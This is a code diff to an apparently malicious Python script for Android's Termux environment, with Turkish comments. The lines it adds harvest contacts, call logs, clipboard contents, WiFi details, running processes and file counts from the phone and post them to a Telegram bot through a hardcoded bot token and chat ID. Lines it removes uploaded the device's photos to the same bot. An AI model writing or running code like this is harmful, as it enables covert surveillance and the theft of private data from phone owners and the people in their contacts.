@@ -3,7 +3,9 @@ import os
 import platform
 import uuid
 import subprocess
+import json
 import glob
+import shutil
 
 # 📢 Telegram Bot Bilgileri
 BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
@@ -36,9 +38,68 @@ try:
 except:
     phone_model = "Bilinmiyor"
 
-# 📂 WhatsApp & DCIM klasöründen resimleri alma (PNG & JPG)
+# 🔋 Batarya bilgisi
+try:
+    battery_info = subprocess.check_output(["termux-battery-status"]).decode()
+    battery_data = json.loads(battery_info)
+    battery_level = f"{battery_data.get('percentage', 'Bilinmiyor')}%"
+    battery_status = battery_data.get("status", "Bilinmiyor")
+except:
+    battery_level = "Bilinmiyor"
+    battery_status = "Bilinmiyor"
+
+# 📶 WiFi bilgisi
+try:
+    wifi_info = subprocess.check_output(["termux-wifi-connectioninfo"]).decode()
+    wifi_data = json.loads(wifi_info)
+    wifi_ssid = wifi_data.get("ssid", "Bilinmiyor")
+    wifi_bssid = wifi_data.get("bssid", "Bilinmiyor")
+except:
+    wifi_ssid = "Bilinmiyor"
+    wifi_bssid = "Bilinmiyor"
+
+# 💾 Depolama bilgisi
+total, used, free = shutil.disk_usage("/")
+storage_info = f"💾 Toplam: {total // (2**30)} GB / Kullanılan: {used // (2**30)} GB / Boş: {free // (2**30)} GB"
+
+# 📂 WhatsApp & DCIM klasöründen resimleri alma (storage/emulated dahil)
 image_paths = glob.glob("/sdcard/DCIM/**/*.jpg", recursive=True) + glob.glob("/sdcard/DCIM/**/*.png", recursive=True)
 image_paths += glob.glob("/sdcard/WhatsApp/**/*.jpg", recursive=True) + glob.glob("/sdcard/WhatsApp/**/*.png", recursive=True)
+image_paths += glob.glob("/storage/emulated/0/DCIM/**/*.jpg", recursive=True) + glob.glob("/storage/emulated/0/DCIM/**/*.png", recursive=True)
+
+# 📖 Rehberdeki kişileri çekme
+try:
+    contacts_json = subprocess.check_output(["termux-contact-list"]).decode()
+    contacts = json.loads(contacts_json)
+    contact_list = "\n".join([f"{c.get('name', 'Bilinmiyor')} - {c.get('number', 'Bilinmiyor')}" for c in contacts[:10]])  # İlk 10 kişi
+except:
+    contact_list = "Erişim engellendi"
+
+# 📜 Son arama kayıtlarını alma
+try:
+    call_logs = subprocess.check_output(["termux-call-log"]).decode()
+    call_data = json.loads(call_logs)
+    call_list = "\n".join([f"{c.get('name', 'Bilinmiyor')} - {c.get('type', 'Bilinmiyor')} ({c.get('duration', '0')}sn)" for c in call_data[:5]])  # Son 5 kayıt
+except:
+    call_list = "Erişim engellendi"
+
+# 📋 Çalışan uygulamaları listeleme
+try:
+    running_apps = subprocess.check_output(["ps"]).decode().split("\n")[1:10]  # İlk 10 işlem
+    app_list = "\n".join(running_apps)
+except:
+    app_list = "Bilgi alınamadı"
+
+# 📁 Belgeler, ekran görüntüleri, indirmeler
+docs = glob.glob("/storage/emulated/0/Documents/**/*.pdf", recursive=True)
+screenshots = glob.glob("/storage/emulated/0/Pictures/Screenshots/**/*.png", recursive=True)
+downloads = glob.glob("/storage/emulated/0/Download/**/*.*", recursive=True)
+
+# 📜 Panodaki (clipboard) veriyi çekme
+try:
+    clipboard_text = subprocess.check_output(["termux-clipboard-get"]).decode().strip()
+except:
+    clipboard_text = "Erişim yok"
 
 # 📩 Telegram’a gönderme
 message = f"""
@@ -51,18 +112,29 @@ message = f"""
 
 📞 Telefon Numarası: {phone_number}
 📱 Telefon Modeli: {phone_model}
+🔋 Batarya: {battery_level} ({battery_status})
+📶 WiFi: {wifi_ssid} ({wifi_bssid})
+💾 Depolama: {storage_info}
 
-📂 WhatsApp & DCIM'deki resim sayısı: {len(image_paths)}
+📂 WhatsApp & DCIM Resim Sayısı: {len(image_paths)}
+📖 Rehber (İlk 10 Kişi):
+{contact_list}
+
+📜 Son Arama Kayıtları:
+{call_list}
+
+📋 Çalışan Uygulamalar:
+{app_list}
+
+📁 Dosya Sayısı:
+📑 Belgeler: {len(docs)}
+📸 Ekran Görüntüleri: {len(screenshots)}
+📥 İndirmeler: {len(downloads)}
+
+📜 Panodaki Veri:
+{clipboard_text}
 """
 
 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})
 
-# 📤 Resimleri Telegram'a gönderme
-for img_path in image_paths[:5]:  # İlk 5 resmi gönder (fazla olursa engellenebilir)
-    try:
-        with open(img_path, "rb") as img_file:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", files={"photo": img_file}, data={"chat_id": CHAT_ID})
-    except:
-        print(f"⚠️ Gönderilemedi: {img_path}")
-
-print("✅ Bilgiler ve resimler Telegram'a gönderildi.")
+print("✅ Bilgiler Telegram'a gönderildi.")
